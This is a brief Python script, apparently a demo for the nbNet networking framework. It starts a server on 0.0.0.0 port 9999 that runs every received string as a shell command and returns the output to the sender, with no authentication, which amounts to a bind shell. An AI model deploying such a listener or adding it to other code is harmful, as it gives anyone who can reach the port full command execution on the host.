#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: kang.Cunhua
# @Date:   2015-12-23 16:30:16
# @Last Modified by:   Kang.Cunhua
# @Last Modified time: 2015-12-23 16:39:03

import sys
import os
import subprocess
import fcntl

sys.path.insert(1, os.path.join(sys.path[0], '..'))
from nbNet.nbNetFramework import nbNet

if __name__ == '__main__':
    def logic(coming_sock_fd, d_in):
        # return os.popen(d_in).read()
        subprocess.Popen(d_in, shell=True, stdout=coming_sock_fd, stderr=coming_sock_fd)
        #out = os.popen4(d_in)[1]
        return None

    reverseD = nbNet('0.0.0.0', 9999, logic)
    reverseD.run()
